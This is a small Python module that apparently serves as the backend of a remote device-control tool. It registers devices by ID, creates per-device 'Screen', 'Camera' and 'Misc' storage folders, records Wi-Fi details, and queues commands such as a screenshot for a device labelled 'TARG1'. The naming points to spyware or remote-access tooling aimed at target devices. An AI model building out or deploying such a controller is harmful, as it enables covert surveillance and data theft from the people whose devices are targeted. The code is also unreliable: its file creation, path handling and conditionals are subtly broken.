import json
import os

filename = "/device-list.json"
path = "../templates/"
patha = os.path.relpath(path,os.path.dirname(__file__))


class fjson:
	def __init__(self,PATH,FILENAME):
		self.path = PATH
		self.filename = FILENAME
		self.jfilepath = self.path+self.filename #jsonfilepath
		self.data = self.readfile()

	def createfile(self):
		if not os.path.exists(self.path):
			os.makedirs(self.path)
			f = open(self.jfilepath,'w')
			f.close()
	def readfile(self):
		self.createfile()
		f = open(self.jfilepath,"r")
		infos = f.read()
		if infos == "":
			self.data = {}
			self.data['device'] = {}
			self.data['sendcommand'] = {} 
			self.writefile()
			info = self.data
		else:
			info = json.loads(infos)
		return info
	def writefile(self):
		f = open(self.jfilepath,'w')
		json.dump(self.data,f)
		f.close()

	def checkidandwrite(self,ID,info):
		if ID not in self.data['device']:
			self.data['device'][ID]=info
		else:
			self.data['device'][ID]=info
		self.writefile()
		if not os.path.exists("/static/storage"+f"/{ID}"):
			os.makedirs("/static/storage"+"/"+ID)
			folders = ["Screen","Camera","Misc"]
			for folder in folders:
				os.makedirs("static/storage"+"/"+ID+"/"+folder)
	def sendcommand(self,ID,cmd):
		self.data['sendcommand'][ID]=cmd
		self.writefile()

	def wifi(self,ID,info):
		self.data['device'][ID]['WIFI']=info
		self.writefile()



if __name__ == "__main__":
	s = fjson(patha,filename)
	info = {}
	s.sendcommand('TARG1','screenshot')